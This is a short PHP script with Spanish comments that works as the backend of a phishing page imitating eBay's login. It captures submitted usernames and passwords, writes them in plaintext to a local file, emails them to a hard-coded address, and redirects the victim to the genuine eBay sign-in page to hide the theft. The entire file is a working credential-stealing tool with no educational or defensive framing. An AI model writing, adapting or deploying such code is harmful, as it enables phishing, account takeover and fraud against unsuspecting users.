<?php
// Verifica si se ha enviado algún dato del formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtiene los datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Abre un archivo para escribir los datos
    $archivo = fopen("datos.txt", "a");

    // Escribe los datos en el archivo
    fwrite($archivo, "Username: " . $username . " - Password: " . $password . "\n");

    // Cierra el archivo
    fclose($archivo);

    // Envía el correo electrónico
    $to = "moiseslira@ciencias.unam.mx";
    $subject = "Datos de inicio de sesión";
    $message = "Usuario: " . $username . "\nContraseña: " . $password;
    mail($to, $subject, $message);

    // Redirige al usuario a la página de inicio de sesión real de eBay
    header("Location: https://signin.ebay.com/signin/");
    exit();
}
?>


